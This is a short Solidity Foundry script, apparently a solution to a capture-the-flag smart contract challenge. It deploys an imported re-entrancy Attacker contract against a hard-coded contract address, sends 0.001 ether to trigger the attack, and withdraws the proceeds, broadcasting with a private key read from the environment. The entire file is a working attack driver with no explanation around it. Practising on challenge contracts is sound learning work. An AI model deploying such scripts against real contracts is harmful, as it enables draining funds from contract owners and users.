// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/Re-entrancy/Attacker.sol";

contract KingScript is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Attacker attacker = new Attacker(0x4CA027196C03cCEc37Cb4f9F742f29e44856C644);

        attacker.attack{value: 0.001 ether}();

        attacker.withdrawAll();
    }
}
